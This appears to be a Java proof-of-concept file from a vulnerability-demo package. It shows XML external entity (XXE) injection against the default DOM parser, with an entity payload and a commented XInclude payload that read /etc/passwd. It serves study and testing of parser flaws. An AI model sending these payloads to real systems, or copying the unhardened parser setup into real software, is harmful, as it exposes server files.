package org.javaweb.vuln;

import com.sun.org.apache.xerces.internal.dom.DOMInputImpl;
import org.w3c.dom.*;
import org.w3c.dom.bootstrap.DOMImplementationRegistry;
import org.w3c.dom.ls.DOMImplementationLS;
import org.w3c.dom.ls.LSParser;

import java.io.ByteArrayInputStream;

public class XXETest {

	public static void main(String[] args) throws Exception {
//		String               xml  = "<data xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"/etc/passwd\"></xi:include></data>";

		String xml = "<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///etc/passwd' >]><article><title>&title;</title></article>";

		System.out.println(xml);

		ByteArrayInputStream bais = new ByteArrayInputStream(xml.getBytes("UTF-8"));

		// get DOM Implementation using DOM Registry
		// System.setProperty(DOMImplementationRegistry.PROPERTY,"org.apache.xerces.dom.DOMXSImplementationSourceImpl");
		DOMImplementationRegistry registry = DOMImplementationRegistry.newInstance();
		DOMImplementationLS       impl     = (DOMImplementationLS) registry.getDOMImplementation("LS");

		// create DOMBuilder
		LSParser     builder  = impl.createLSParser(DOMImplementationLS.MODE_SYNCHRONOUS, null);
		DOMInputImpl domInput = new DOMInputImpl();
		domInput.setByteStream(bais);

		Document doc     = builder.parse(domInput);
		Element  element = doc.getDocumentElement();

		Node firstChild = element.getFirstChild().getFirstChild();

		NodeList titleTag = element.getElementsByTagName("title");
		String   value    = titleTag.item(0).getFirstChild().getNodeValue();

		System.out.println(value);

		while (element.hasAttributes()) {
			NamedNodeMap attributes = element.getAttributes();

			for (int i = 0; i < attributes.getLength(); i++) {
				Node item = attributes.item(i);
				System.out.println(item);
			}
		}

		NodeList childNodes = element.getChildNodes();

//		for (int i = 0; i < childNodes.getLength(); i++) {
//			Node     item  = childNodes.item(i);
//			NodeList nodes = item.getChildNodes();
//
//			for (int j = 0; j < nodes.getLength(); j++) {
//				Node item1 = nodes.item(j);
//
//				System.out.println(item1);
//			}
//		}


	}

}
